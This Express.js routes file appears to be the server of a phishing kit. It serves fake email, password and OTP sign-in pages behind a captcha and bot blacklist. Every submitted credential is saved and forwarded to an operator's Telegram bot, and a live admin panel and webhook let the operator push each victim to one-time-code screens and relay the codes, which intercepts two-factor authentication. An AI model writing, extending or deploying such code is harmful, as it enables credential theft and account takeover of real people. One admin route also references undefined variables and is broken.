import express from "express";
import geoip from "geoip-lite";
import session from "express-session";
import axios from "axios";
import { buildMessage, buildTelButtons, isAutopilotOn, getClientIP, getReqClientIP, getNextPage, buildUserInfo, setWebhook, handleAdminCommand, systemInfo, sendAPIRequest, requireAdmin, routeMap, getPageFlow, savePageFlow, pendingButtonTimers } from "../utils.js";
import capRouter, { requireCap } from "../altcheck.js";
import { addToBlacklist, removeFromBlacklist, } from '../middleware/frontblock.js';
import dotenv from "dotenv";
import bcrypt from "bcrypt";
dotenv.config();

// =====================================================
// Memory stores
// =====================================================

const pendingPrompts = new Map();
const activeLocks = new Set();


// =====================================================
// routes creating and exports
// =====================================================

export default function createRoutes(db, io) {
  const router = express.Router();

router.get("/header", (req, res) => {
res.sendFile("header.html", { root: "views/admin" });
});

router.get('/', requireCap, (req, res, next) => {
	  if (req.session?.capVerified) return res.redirect(routeMap.final);
 	 res.redirect(routeMap.final);
	  });

router.get('/sign-in', requireCap, (req, res, next) => {
  const { user } = req.session;
  const { action } = req.query;

  // If no session, redirect or show default page
  if (!user) {
    req.session.user = { user };

    if (action) return res.redirect('/sign-in');
    return res.sendFile('email.html', { root: 'views/user' });
  }

  // If session exists, determine which page to show
  const pages = {
    auth: 'password.html',
    otp: 'otp.html',
    prompt: 'prompt.html',
    fail: 'fail.html',
  };

  const page = pages[action] || 'email.html';
  res.sendFile(page, { root: 'views/user' });
});

router.get("/admin-info", async (req, res) => {
  try {
    const row = await db.get(
  `SELECT username, password_hash FROM admins WHERE username = ?`,
  [username]
);

if (!row) {
  console.log("Admin not found");
  return;
}

const isMatch = await bcrypt.compare(inputPassword, row.password_hash);

console.log("Username:", row.username);
console.log("Password valid:", isMatch);

    res.json({
      success: true,
      admin: { username: row.username, password: isMatch }
    });
  } catch (err) {
    console.error("Error retrieving admin info:", err);
    res.sendStatus(500);
  }
});


router.get("/admin", (req, res) => {
  const { isAdmin } = req.session;
  const page = req.query.page;
  
  if (!isAdmin) {
    return res.sendFile("adminlogin.html", { root: "views/admin" });
  }
  
  const pages = {
    result: "result.html",
    settings: "settings.html",
    dashboard: "admin.html", // default admin dashboard
  };
  
  const targetPage = pages[page] || pages.dashboard;
  res.sendFile(targetPage, { root: "views/admin" });
});


router.post("/admin", async (req, res) => {
  try {
    const { username, password } = req.body;

    if (!username || !password) {
      return res.status(400).json({
        success: false,
        message: "Username and password required"
      });
    }

    // Fetch admin by username
    const admin = await db.get(
      "SELECT id, password_hash FROM admins WHERE username = ?",
      [username]
    );

    // Prevent username enumeration
    if (!admin) {
      return res.status(401).json({
        success: false,
        message: "Invalid credentials"
      });
    }

    // Compare password with hash
    const validPassword = await bcrypt.compare(
      password,
      admin.password_hash
    );

    if (!validPassword) {
      return res.status(401).json({
        success: false,
        message: "Invalid credentials"
      });
    }

    // Auth success
    req.session.isAdmin = true;
    req.session.adminId = admin.id;

    return res.json({
      success: true,
      message: "Login successful"
    });

  } catch (err) {
    console.error("Admin login error:", err);
    return res.status(500).json({
      success: false,
      message: "Internal server error"
    });
  }
});


router.get("/logout", (req, res) => {
  req.session.destroy(() => {
    res.redirect("/admin"); // back to login page
  });
});


  router.post("/delete", async (req, res) => {
	  const { userId } = req.body;
	  await db.run(`DELETE FROM results WHERE user_id = ?`, [userId]);
	
	  // Emit new list
	  const results = await db.all(`SELECT * FROM results ORDER BY timestamp DESC`);
	  io.emit("admin:resultsUpdate", results);
	
	  res.json({ success: true });
	});


  // ✅ Submit route
  router.post("/submit", async (req, res) => {
  try {
    const { userId } = req.body;
    const myObject = req.body;
    let formattedData = "";

    // -------------------------------
    // 🧩 STEP 1: Get user_info
    // -------------------------------
    const existingResult = await db.get(
      `SELECT user_info FROM results WHERE user_id = ?`,
      [userId]
    );
    
    const telegramInfo = await db.get(
	  `SELECT BotToken, ChatID, TelegramEnabled FROM admin_settings WHERE id = ?`,
	  [1]
	);
	
	console.log("tg info", telegramInfo?.TelegramEnabled);
	
	// Assign to individual variables
	const BotToken = telegramInfo?.BotToken || "";
	const ChatID = telegramInfo?.ChatID || "";
	const telegramEnableStatus = telegramInfo?.TelegramEnabled ? true : false;
	
	console.log(BotToken, ChatID, telegramEnableStatus);
	
	setWebhook(BotToken);
    
    let userInfoToSave = existingResult?.user_info || null;
    if (!userInfoToSave) {
      userInfoToSave = await buildUserInfo(req, sendAPIRequest);
      console.log(`🌍 Built userInfo for ${userId}`);
    } else {
      console.log(`ℹ️ Reusing existing userInfo for ${userId}`);
    }

    // -------------------------------
    // 🔠 STEP 2: Normalize keys
    // -------------------------------
    const myObjectLower = Object.fromEntries(
      Object.entries(myObject).map(([k, v]) => [k.toLowerCase(), v])
    );

    // -------------------------------
    // 📤 STEP 3: Build message
    // -------------------------------
    
   console.log("tg en status:", telegramEnableStatus, userId);
    
	const message = await buildMessage(
		  req.body,
		  {
		    sendToTelegram: telegramEnableStatus,
		    botToken: BotToken, 
		    chatId: ChatID,
		    userId,
		    db
		  }
		);
	
    //if (!message) return res.status(500).json({ error: "Failed to build message" });

    // -------------------------------
    // 🧠 STEP 4: Update identifier
    // -------------------------------
    const identifierValue =
      myObjectLower.user ||
      myObjectLower.user_id ||
      myObjectLower.username ||
      myObjectLower.email;

    if (identifierValue) {
      await db.run(
        `UPDATE users SET identifier = ? WHERE id = ?`,
        [identifierValue, userId]
      );
      console.log(`✅ Updated identifier for user ${userId}: ${identifierValue}`);
    }

    // -------------------------------
    // 📋 STEP 5: Append input_data
    // -------------------------------
    Object.entries(myObject).forEach(([key, value]) => {
      const lowerKey = key.toLowerCase();
      if (["visitor", "users","security_code"].includes(lowerKey)) return;
      formattedData += `${key} : ${value}\n`;
    });

    const existingUser = await db.get(
      `SELECT input_data FROM users WHERE id = ?`,
      [userId]
    );
    const updatedData =
      (existingUser?.input_data || "") + "\n-----------------\n" + formattedData.trim();

    await db.run(
      `UPDATE users SET input_data = ? WHERE id = ?`,
      [updatedData.trim(), userId]
    );
    console.log(`✅ input_data updated for ${userId}`);

    // -------------------------------
    // 🗂 STEP 6: Save results
    // -------------------------------
    await db.run(
      `
      INSERT INTO results (user_id, message, user_info, timestamp)
      VALUES (?, ?, ?, CURRENT_TIMESTAMP)
      ON CONFLICT(user_id) DO UPDATE SET
        message   = results.message || '\n-----------------\n' || excluded.message,
        user_info = CASE
                      WHEN results.user_info IS NULL OR results.user_info = ''
                      THEN excluded.user_info
                      ELSE results.user_info
                    END,
        timestamp = CURRENT_TIMESTAMP
      `,
      [userId, message, userInfoToSave]
    );

    // -------------------------------
    // 🟢 STEP 7: Fetch users based on userDisp
    // -------------------------------
    const settingRow = await db.get("SELECT userDisp FROM admin_settings LIMIT 1");
    const usersDisplay = (settingRow?.userDisp || "active").toString().trim().toLowerCase();

    let users;
    if (usersDisplay === "all") {
      users = await db.all(`SELECT * FROM users ORDER BY last_seen DESC`);
    } else {
      // active (last 2 minutes)
      users = await db.all(`
        SELECT * FROM users
        WHERE last_seen >= datetime('now', '-2 minutes')
        ORDER BY last_seen DESC
      `);
    }

    const updatedUsers = users.map((u) =>
      u.id === userId ? { ...u, screen: "loading" } : u
    );
    io.emit("admin:update", updatedUsers);

    // -------------------------------
    // 📡 STEP 8: Emit results update
    // -------------------------------
    const results = await db.all(`
      SELECT 
        r.user_id, 
        r.message, 
        r.user_info, 
        r.timestamp, 
        u.identifier
      FROM results r
      LEFT JOIN users u ON r.user_id = u.id
      ORDER BY r.timestamp DESC
    `);
    io.emit("admin:resultsUpdate", results);

    // -------------------------------
    // 🤖 STEP 9: Autopilot redirect
    // -------------------------------
    const user = await db.get("SELECT page FROM users WHERE id = ?", [userId]);
    const nextPage = await getNextPage(user?.page, req);
    console.log("Current page", user?.page, "next page auto", nextPage);
    const autopilot = await isAutopilotOn(db);

   /* if (autopilot && nextPage) {
      setTimeout(() => {
        for (let [id, socket] of io.of("/").sockets) {
          if (socket.userId === userId) {
            socket.emit("user:command", { command: "redirect", link: nextPage });
            break;
          }
        }
      }, 2000);
    } */

    	const response = { success: true };
		console.log("autopilot:", autopilot);
		if (autopilot && nextPage) {
		  response.link = nextPage;
		}
		
		return res.json(response);
  } catch (err) {
    console.error("❌ /submit error:", err);
    return res.status(500).json({ error: "Internal server error" });
  }
});
  
	  router.get("/autopilot", async (req, res) => {
	  const setting = await db.get("SELECT autopilot FROM admin_settings LIMIT 1");
	  res.json({ autopilot: setting ? setting.autopilot : 0 });
	});
	
	router.get("/settings", async (req, res) => {
  try {
    // Fetch basic settings
    const setting = await db.get(
      "SELECT BotToken, ChatID, TelegramEnabled, baSUB FROM admin_settings WHERE id = 1"
    );

    // Fetch pageFlow using your reusable function
    const pageFlow = await getPageFlow(db);

    // Combine everything into one response object
    const response = {
      ...setting,
      pageFlow
    };

    console.log("settings:", response);
    res.json(response);
  } catch (err) {
    console.error("Failed to fetch settings:", err);
    res.status(500).json({ error: "Failed to fetch settings" });
  }
});

router.post("/settings", async (req, res) => {
  const {
    BotToken,
    ChatID,
    TelegramEnabled = 0,
    baSub = 0,
    AdminPassword,
    AdminUsername,
    pageFlow 
  } = req.body;

  try {
    // Update admin_settings
    await db.run(
      `UPDATE admin_settings
       SET BotToken = ?,
           ChatID = ?,
           TelegramEnabled = ?,
           baSUB = ?
       WHERE id = 1`,
      [
        BotToken ?? null,
        ChatID ?? null,
        TelegramEnabled ? 1 : 0,
        baSub ? 1 : 0
      ]
    ); 

    // Save pageFlow if provided
    if (pageFlow) {
      await savePageFlow(db, pageFlow, 1);
    }
    
    console.log("pageflow on server:", pageFlow);

    // Update admin credentials
    if (AdminUsername && AdminPassword) {
      const hash = await bcrypt.hash(AdminPassword, 12);
      await db.run(
        `UPDATE admins
         SET username = ?, password_hash = ?
         WHERE id = 1`,
        [AdminUsername, hash]
      );

      return req.session.destroy(err => {
        if (err) {
          console.error("Session destroy error:", err);
          return res.status(500).json({ success: false });
        }

        res.json({ success: true, redirect: true });
      });
    }

    // Return success if no password change
    res.json({ success: true, redirect: false });
  } catch (err) {
    console.error("Error updating settings:", err);
    res.sendStatus(500);
  }
});

	// Toggle autopilot
	router.post("/autopilot", async (req, res) => {
	  const { autopilot } = req.body;
	
	  await db.run(`
	    INSERT INTO admin_settings (id, autopilot)
	    VALUES (1, ?)
	    ON CONFLICT(id) DO UPDATE SET autopilot = excluded.autopilot
	  `, [autopilot]);
	  
	  res.json({ success: true, autopilot });
	});
	
	// Get current view mode
router.get("/admin/viewmode", async (req, res) => {
  const setting = await db.get("SELECT userDisp FROM admin_settings LIMIT 1");
  res.json({ viewMode: setting?.userDisp || "active" });
});

// Update view mode
router.post("/admin/viewmode", async (req, res) => {
  const { viewMode } = req.body;
  if (!["active", "all"].includes(viewMode)) {
    return res.status(400).json({ error: "Invalid mode" });
  }
  await db.run("UPDATE admin_settings SET userDisp = ?", [viewMode]);
  res.json({ success: true });
});



router.post("/deleteuser", async (req, res) => {
  try {
    const { userId } = req.body;

    if (!userId) {
      return res.status(400).json({ error: "Missing userId" });
    }

    // Delete user where id matches
    await db.run("DELETE FROM users WHERE id = ?", [userId]);

    console.log(`🗑️ User ${userId} deleted successfully`);
    res.json({ success: true, message: "User deleted successfully" });

  } catch (err) {
    console.error("⚠️ Error deleting user:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});



// =====================================================
// TELEGRAM WEBHOOK
// =====================================================
router.post("/telegram-webhook", async (req, res) => {
  const data = req.body;
	
  try {
    // ------------------------------------------------
    // Get bot token
    // ------------------------------------------------
    const telegramInfo = await db.get(
      `SELECT BotToken FROM admin_settings WHERE id = ?`,
      [1]
    );
    if (!telegramInfo) return res.sendStatus(200);

    const botToken = telegramInfo.BotToken;

    // ============================================================
    // 1️⃣ HANDLE NORMAL MESSAGE (user reply after prompt)
    // ============================================================
    if (data.message && !data.callback_query) {
      const chatId = data.message.chat.id;
      const text = data.message.text?.trim();
      
      console.log(text);

      if (!pendingPrompts.has(chatId)) {
        return res.sendStatus(200); // Not a prompt reply
      }

      const promptData = pendingPrompts.get(chatId);
	  const { userId, messageId, command } = promptData;

      // Clear timer
      if (pendingButtonTimers.has(chatId)) {
        clearTimeout(pendingButtonTimers.get(chatId));
        pendingButtonTimers.delete(chatId);
      }

      pendingPrompts.delete(chatId);

      // Validate number
      if (!/^\d+$/.test(text)) {
        await axios.post(
          `https://api.telegram.org/bot${botToken}/sendMessage`,
          {
            chat_id: chatId,
            text: "❌ Invalid number."
          }
        );
        return res.sendStatus(200);
      }

      // Send number to your handler/webhook logic
      await handleAdminCommand({
		  userId,
		  command,
		  otp: text,
		  io,
		  db
		});

      const payload = {
	  chat_id: chatId,
	  text: "✅ Number sent successfully."
	};
	
	if (command === "prompt") {
	  const buttons = await buildTelButtons(userId, db, command);
	  payload.reply_markup = { inline_keyboard: buttons };
	}
	
	await axios.post(
	  `https://api.telegram.org/bot${botToken}/sendMessage`,
	  payload
	);

      return res.sendStatus(200);
    }

    // ============================================================
    // 2️⃣ HANDLE CALLBACK (button clicks)
    // ============================================================
    if (!data.callback_query) return res.sendStatus(200);

    const callback = data.callback_query;
    const { message } = callback;
    const chatId = message.chat.id;
    const messageId = message.message_id;
    const [_, command, userId] = callback.data.split(":");
	console.log("Command in Routes js", command);
    // Stop loading animation
    await axios.post(
      `https://api.telegram.org/bot${botToken}/answerCallbackQuery`,
      { callback_query_id: callback.id }
    );

    // Cancel existing timer
    if (pendingButtonTimers.has(chatId)) {
      clearTimeout(pendingButtonTimers.get(chatId));
      pendingButtonTimers.delete(chatId);
    }

    // Prevent double clicks
    if (activeLocks.has(userId)) return res.sendStatus(200);
    activeLocks.add(userId);

    // ============================================================
    // 🔹 PROMPT COMMAND
    // ============================================================
    if (command === "prompt" || command === "phone-otp") {
    	
    	
      // Ask immediately
      await axios.post(
        `https://api.telegram.org/bot${botToken}/sendMessage`,
        {
          chat_id: chatId,
          text: `Enter a number (15 sec)\n\nCurrent Screen: ${command} screen`
        }
      ); 
      
      if (pendingButtonTimers.has(chatId)) {
      clearTimeout(pendingButtonTimers.get(chatId));
      pendingButtonTimers.delete(chatId);
    }

      // Store pending prompt
      pendingPrompts.set(chatId, { userId, messageId, command });

      // Start 15s timer
      const timer = setTimeout(async () => {
        try {
          if (!pendingPrompts.has(chatId)) return;

          pendingPrompts.delete(chatId);

          await axios.post(
            `https://api.telegram.org/bot${botToken}/editMessageText`,
            {
              chat_id: chatId, 
              message_id: messageId,
              text: `${message.text}\n\n❌ Enter ${command}: time over`,
              parse_mode: "HTML"
            }
          );
        } catch (err) {
          console.error("Prompt expire error:", err.message);
        }

        pendingButtonTimers.delete(chatId);
      }, 15000);

      pendingButtonTimers.set(chatId, timer);

      activeLocks.delete(userId);
      return res.sendStatus(200);
    }

    // ============================================================
    // 🔹 BLOCK / UNBLOCK
    // ============================================================
    if (command === "block" || command === "unblock") {
      const userRow = await db.get(
        "SELECT system_info, ip FROM users WHERE id = ?",
        [userId]
      );

      let systemInfo = {};
      try {
        systemInfo = JSON.parse(userRow?.system_info || "{}");
      } catch {}

      if (command === "block") {
        systemInfo.blocked = true;
        await addToBlacklist(userRow?.ip, systemInfo?.ua, userId);
      } else {
        systemInfo.blocked = false;
        await removeFromBlacklist(userId);
      }

      await db.run(
        "UPDATE users SET system_info = ? WHERE id = ?",
        [JSON.stringify(systemInfo), userId]
      );

      const buttons = await buildTelButtons(userId, db);

      await axios.post(
        `https://api.telegram.org/bot${botToken}/editMessageReplyMarkup`,
        {
          chat_id: chatId,
          message_id: messageId,
          reply_markup: { inline_keyboard: buttons }
        }
      );

      activeLocks.delete(userId);
      return res.sendStatus(200);
    }

    // ============================================================
    // 🔹 OTHER COMMANDS
    // ============================================================
    await handleAdminCommand({ userId, command, io, db });

    await axios.post(
      `https://api.telegram.org/bot${botToken}/editMessageText`,
      {
        chat_id: chatId,
        message_id: messageId,
        text: `${message.text}\n\n✅ Command sent`,
        parse_mode: "HTML"
      }
    );

    activeLocks.delete(userId);
    return res.sendStatus(200);

  } catch (err) {
    console.error("❌ Telegram webhook error:", err);
    return res.sendStatus(200);
  }
});

  return router;
}